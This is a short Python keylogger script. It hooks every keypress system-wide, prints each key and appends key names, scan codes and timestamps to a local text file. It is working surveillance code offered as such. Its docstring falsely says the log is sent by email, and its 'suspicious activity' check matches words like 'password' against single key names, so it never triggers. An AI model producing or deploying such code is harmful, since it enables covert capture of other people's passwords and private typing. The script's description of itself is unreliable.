import keyboard

def detect_suspicious_activity(key_info):
    """
    Detects suspicious activity in the keystroke log.
    """
    suspicious_patterns = ['password', 'username', 'credit card', 'login']

    for pattern in suspicious_patterns:
        if pattern in key_info.lower():
            return True

    return False

def keylogger_callback(event):
    """
    Callback function for the keylogger.
    Records the pressed key, sends the log via email, and saves it to a text file.
    It also detects suspicious activity and sends an alert if necessary.
    """
    try:
        key_name = event.name
        scan_code = event.scan_code
        time_stamp = event.time

        # Build a string with the key information
        key_info = f"Key: {key_name}, Scan Code: {scan_code}, Time: {time_stamp}\n"

        # Print the information to the console
        print(key_name, end="")

        # Detect suspicious activity
        if detect_suspicious_activity(key_info):
            print("Alert! Suspicious activity detected.")

        # Save the information to a text file
        with open("keylog.txt", "a", encoding="utf-8") as file:
            file.write(key_info)
            
    except Exception as e:
        print(f"Error capturing keys: {e}")

def main():
    print("Starting Keylogger. Press any key to begin logging...")

    # Set up the keylogger hook
    keyboard.on_press(keylogger_callback)

    try:
        # Wait indefinitely until a key is pressed to terminate the program
        keyboard.wait()
    except KeyboardInterrupt:
        # Handle keyboard interruption (Ctrl+C) to gracefully exit
        print("\nKeylogger stopped. Exiting...")

if __name__ == "__main__":
    main()
